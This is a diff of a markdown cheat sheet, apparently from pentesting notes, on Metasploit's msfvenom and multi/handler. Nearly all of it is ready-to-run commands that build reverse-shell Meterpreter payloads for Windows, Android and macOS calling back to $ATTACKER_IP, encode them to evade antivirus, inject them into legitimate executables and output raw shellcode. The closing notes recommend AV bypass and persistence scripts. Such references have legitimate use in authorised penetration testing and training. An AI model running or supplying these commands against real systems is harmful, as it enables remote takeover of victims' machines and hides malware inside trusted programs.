@@ -1,4 +1,6 @@
+#tool
 ## Info
+
 - **Type:** Payload generation tool
 - **Part of:** Metasploit Framework
 - **Common Usage:** Generates shellcode and payloads for exploitation
@@ -7,15 +9,23 @@
 ## Usage
 
 ### Listener Setup in Metasploit
+
+Before executing a payload, set up a Metasploit listener to receive the reverse connection:
+
 ```bash
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST $ATTACKER_IP
 set LPORT 4444
-exploit
+run
 ```
 
+_Alternatively, use `exploit -j` to run it in the background._
+
+---
+
 ### Generating a Basic Reverse Shell Payload
+
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o shell.exe
 ```
@@ -25,6 +35,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe
 - `LPORT`: Listening port for reverse connection
 - `-f`: Format of output (e.g., exe, elf, raw, py, etc.)
 - `-o`: Output file
+
+---
 
 ### Common Payloads
 
@@ -69,6 +81,8 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -o she
 msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f macho -o shell.macho
 ```
 
+---
+
 ### Encoding Payloads (Bypass AV Detection)
 
 ```bash
@@ -78,6 +92,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -e x86
 - `-e`: Encoder (e.g., `x86/shikata_ga_nai`)
 - `-i`: Iterations (multiple encoding passes)
 
+---
+
 ### Injecting Payloads into Executables
 
 ```bash
@@ -85,7 +101,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -x cle
 ```
 
 - `-x`: Base executable file
-- `-k`: Keep functionality of the original file
+- `-k`: Keep functionality of the original file (can increase detection rate)
+
+---
 
 ### Converting Payloads to Shellcode
 
@@ -93,4 +111,14 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -x cle
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f c
 ```
 
-- Outputs shellcode in C format for manual injection
+- Outputs shellcode in **C format** for manual injection
+
+---
+
+### Additional Notes
+
+- **Always test payloads in a controlled environment** before using them
+- **Use encoding techniques to bypass antivirus detection**
+- **For persistence**, consider combining with `Metasploit Persistence Scripts`
+- **To run Metasploit in the background**, use `exploit -j -z`
+
